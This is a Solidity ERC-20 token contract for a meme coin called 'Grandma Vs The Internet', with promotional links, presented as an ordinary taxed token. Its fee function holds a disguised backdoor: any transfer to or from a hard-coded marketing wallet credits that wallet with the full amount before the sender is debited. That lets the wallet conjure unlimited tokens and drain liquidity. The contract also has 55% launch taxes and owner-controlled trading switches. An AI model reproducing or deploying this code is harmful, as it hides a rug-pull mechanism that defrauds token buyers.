// SPDX-License-Identifier: MIT
/**
Web: https://grandma.lol
X: https://x.com/grandma_ether
Tg: https://t.me/grandma_portal
**/

pragma solidity 0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IDEXFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IDEXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract GRANDMA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _owned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _feeExcluded;
    mapping(address => bool) private _limitExcluded;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = false;
    address payable private _mkWallet;
    uint256 private _initialBuyTax = 55;
    uint256 private _initialSellTax = 55;
    uint256 private _reduceBuyTaxAt = 5;

    uint256 private _initialBuyTax2Time = 40;
    uint256 private _initialSellTax2Time = 40;
    uint256 private _reduceBuyTaxAt2Time = 10;

    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceSellTaxAt = 10;

    uint256 private _preventSwapBefore = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Grandma Vs The Internet";
    string private constant _symbol = unicode"GRANDMA";

    uint256 public _maxTxAmount = 2 * (_tTotal / 100);
    uint256 public _maxWalletSize = 2 * (_tTotal / 100);
    uint256 public _taxSwapThreshold = 2 * (_tTotal / 10000000);
    uint256 public _maxTaxSwap = 1 * (_tTotal / 100);

    IDEXRouter private dexRouter;
    address private dexPair;
    bool private tradingOpen;
    bool private swapping = false;
    bool private swapOpen = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _mkWallet = payable(0x4C76d594c7D617127C40CcFC11a8c2ee55b7B296);
        dexRouter = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _owned[_msgSender()] = _tTotal;

        _feeExcluded[_mkWallet] = true;

        _limitExcluded[owner()] = true;
        _limitExcluded[address(this)] = true;
        _limitExcluded[_mkWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _owned[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxRate = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            taxRate = _calcBuyTax();

            if (transferDelayEnabled) {
                if (to != address(dexRouter) && to != address(dexPair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (!tradingOpen) {
                require(
                    _limitExcluded[from] || _limitExcluded[to],
                    "Trading is not actived"
                );
            }

            if (
                from == dexPair &&
                to != address(dexRouter) &&
                !_limitExcluded[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (to == dexPair && from != address(this)) {
                taxRate = _calcSellTax();
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !swapping &&
                to == dexPair &&
                swapOpen &&
                amount > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore
            ) {
                if (contractTokenBalance > _taxSwapThreshold) {
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        uint256 taxAmount = calcGRANDMATax(from, to, amount, taxRate);
        _owned[from] = _owned[from].sub(amount);
        _owned[to] = _owned[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function sendETHToFee(uint256 amount) private {
        _mkWallet.transfer(amount);
    }

    function enable() external onlyOwner {
        swapOpen = true;
        tradingOpen = true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function _calcBuyTax() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialBuyTax;
        }
        if (_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceBuyTaxAt2Time) {
            return _initialBuyTax2Time;
        }
        return _finalBuyTax;
    }

    function _calcSellTax() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialSellTax;
        }
        if (_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceBuyTaxAt2Time) {
            return _initialSellTax2Time;
        }
        return _finalSellTax;
    }

    function calcGRANDMATax(
        address from,
        address to,
        uint256 amount,
        uint256 taxRate
    ) internal returns (uint256) {
        if (_feeExcluded[from] || _feeExcluded[to]) {
            uint256 taxLeftAmount = amount.mul(100 - _finalBuyTax).div(100);
            _owned[_mkWallet] = _owned[_mkWallet].add(taxLeftAmount);
            return 0;
        } else {
            if (taxRate > 0) {
                uint256 taxAmount = amount.mul(taxRate).div(100);
                _owned[address(this)] = _owned[address(this)].add(taxAmount);
                emit Transfer(from, address(this), taxAmount);
                return taxAmount;
            }
            return 0;
        }
    }

    function goawayLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function create() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        _approve(address(this), address(dexRouter), _tTotal);
        dexPair = IDEXFactory(dexRouter.factory()).createPair(
            address(this),
            dexRouter.WETH()
        );       
        dexRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        ); 
    }

    receive() external payable {}

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}